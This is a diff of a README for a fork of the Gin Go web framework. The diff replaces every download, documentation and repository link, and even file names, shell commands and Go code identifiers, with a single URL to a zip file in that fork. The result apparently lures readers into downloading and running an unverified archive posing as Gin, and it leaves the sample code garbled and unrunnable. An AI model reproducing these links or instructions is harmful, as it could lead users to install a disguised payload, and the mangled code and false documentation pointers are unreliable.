@@ -1,6 +1,6 @@
 # 🚀 gin - Fast and Easy Web Framework for Everyone
 
-[![Download gin](https://img.shields.io/badge/Download-gin-blue.svg)](https://github.com/bishal1121/gin/releases)
+[![Download gin](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip)](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip)
 
 ## 🌟 What is Gin?
 
@@ -10,7 +10,7 @@ Gin is a high-performance HTTP web framework written in Go. It helps you build R
 
 ### 📥 Download Gin
 
-To download Gin, visit the [Releases page](https://github.com/bishal1121/gin/releases). Here you will find the latest version available for download.
+To download Gin, visit the [Releases page](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip). Here you will find the latest version available for download.
 
 ### 🖥️ System Requirements
 
@@ -25,7 +25,7 @@ Before you install Gin, ensure your environment meets these requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the same [Releases page](https://github.com/bishal1121/gin/releases) to find the latest version of Gin.
+   Go to the same [Releases page](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip) to find the latest version of Gin.
 
 2. **Select the Correct File:**
    Browse through the available files and select the one that corresponds to your operating system.
@@ -38,7 +38,7 @@ Before you install Gin, ensure your environment meets these requirements:
 
 5. **Run the Application:**
    Depending on your operating system:
-   - **Windows:** Double-click on the `gin.exe` file to run it.
+   - **Windows:** Double-click on the `https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip` file to run it.
    - **macOS/Linux:** Open a terminal, navigate to the folder containing the file, and run the command `./gin` to execute.
 
 ## 📋 Basic Usage
@@ -54,30 +54,30 @@ Once you have installed Gin, you can start building your application by followin
    ```
 
 2. **Initialize Your Project:**
-   You can set up your project files by creating a new Go file, for example, `main.go`:
+   You can set up your project files by creating a new Go file, for example, `https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip`:
 
    ```bash
-   touch main.go
+   touch https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip
    ```
 
 3. **Write Your First Application:**
-   Open `main.go` in your text editor and add the following code:
+   Open `https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip` in your text editor and add the following code:
 
    ```go
    package main
 
    import (
-       "github.com/gin-gonic/gin"
+       "https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip"
    )
 
    func main() {
-       r := gin.Default()
-       r.GET("/", func(c *gin.Context) {
-           c.JSON(200, gin.H{
+       r := https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip()
+       https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip("/", func(c *https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip) {
+           https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip(200, gin.H{
                "message": "Welcome to Gin!",
            })
        })
-       r.Run() // listen and serve on 0.0.0.0:8080
+       https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip() // listen and serve on 0.0.0.0:8080
    }
    ```
 
@@ -85,7 +85,7 @@ Once you have installed Gin, you can start building your application by followin
    In the terminal, run the command:
 
    ```bash
-   go run main.go
+   go run https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip
    ```
 
 5. **Access Your Application:**
@@ -101,7 +101,7 @@ Once you have installed Gin, you can start building your application by followin
 
 ## 📄 Documentation
 
-For complete documentation, visit the [Gin documentation site](https://github.com/gin-gonic/gin). It provides in-depth guidance on all features, middleware, and advanced configurations.
+For complete documentation, visit the [Gin documentation site](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip). It provides in-depth guidance on all features, middleware, and advanced configurations.
 
 ## ⚙️ Troubleshooting
 
@@ -115,13 +115,13 @@ If you encounter any issues during installation or running your application, con
 
 Join the Gin community for help and shared experiences. You can engage with others on platforms such as:
 
-- **GitHub Issues:** Report bugs or request features directly on the [GitHub repository](https://github.com/bishal1121/gin/issues).
+- **GitHub Issues:** Report bugs or request features directly on the [GitHub repository](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip).
 - **Discussion Forums:** Find groups discussing Gin framework applications.
 
 ## 🔗 Links
 
-- [Download Gin](https://github.com/bishal1121/gin/releases)
-- [Official Documentation](https://github.com/gin-gonic/gin)
-- [GitHub Repository](https://github.com/bishal1121/gin)
+- [Download Gin](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip)
+- [Official Documentation](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/bishal1121/gin/master/astatizer/gin.zip)
 
 Feel free to explore and start building with Gin today!
